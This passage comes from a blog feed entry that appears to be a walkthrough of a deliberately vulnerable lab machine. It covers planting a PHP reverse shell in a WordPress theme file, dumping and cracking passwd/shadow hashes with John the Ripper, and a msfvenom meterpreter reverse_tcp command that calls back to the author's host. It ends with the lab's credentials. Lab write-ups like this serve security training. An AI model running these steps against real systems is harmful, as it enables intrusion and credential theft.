-<p><font color="red">admin / SuperSecretPassword</font></p>
-
-<p>Next, modify the pentestmonkey&rsquo;s PHP reverse shell' IP and port to my Kali&rsquo;s port 5555 and setup NC to listen on this port.</p>
-
-<p>Then by using the collected admin credential, I successfully logged in wordpress dashboard on server&rsquo;s port 8080.</p>
-
-<p>Then go to <code>Appearance --&gt; Editor --&gt; function.php</code>, delete all the content and paste the reverse shell&rsquo;s php code before &ldquo;Update File&rdquo;</p>
-
-<p>Now we got a shell with limited privilege. After poking around the file system, I read the passwd file which the secrets saved in the file too. Surprisingly, the shadow file also can be read.</p>
-
-<p>So dump the passwd and shadow file to my kali and add all found passwords (<em>SuperSecretPassword</em>) into the dictionary file (I use <em>rockyou.txt</em> here)</p>
-
-<p>Then use <em>john the ripper</em> to crack the hashes and got the following result:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>echo "SuperSecretPassword" > ~/tmp/dict.txt
-</span><span class='line'>cat /usr/share/wordlists/rockyou.txt >> ~/tmp/dict.txt
-</span><span class='line'>unshadow passwd.txt shadow.txt > unshadow.txt
-</span><span class='line'>john unshadow.txt --wordlist=~/tmp/dict.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/4.png"></p>
-
-<p>Bingo! the root user use the same password as wordpress admin.</p>
-
-<p>In the meantime of cracking the passwords, I create and upload linux meterpreter reverse shell (<em>lmp443</em>) to target server in order to get a better interactive shell.</p>
-
-<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.131 LPORT=443 -f elf &gt; /var/www/lmp443</code></p>
-
-<p>Then set up Metasploit on my Kali to use exploit <code>php/meterpreter/reverse_tcp</code> and listen on port <code>443</code></p>
-
-<p>Then trigger the shell and get a meterpreter shell back to my Kali. Finally, use <code>su</code> command with cracked root password to get ROOT.</p>
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/5.png"></p>
-
-<h2>Appendix</h2>
-
-<p><strong>All passwords found/cracked:</strong></p>
-
-<p><strong>Wordpress password:</strong></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>admin / SuperSecretPassword</span></code></pre></td></tr></table></div></figure>
-
-
-<p><strong>login.php password:</strong></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>candyshop / password
-</span><span class='line'>Sir / PopRocks</span></code></pre></td></tr></table></div></figure>
-
-
-<p><strong>MySQL password:</strong></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword</span></code></pre></td></tr></table></div></figure>
-
-
-<p><strong>User password:</strong></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root / SuperSecretPassword
-</span><span class='line'>user / SuperSecretPassword
-</span><span class='line'>candycane / password</span></code></pre></td></tr></table></div></figure>
-
-
-
 ]]></content>
   </entry>
   
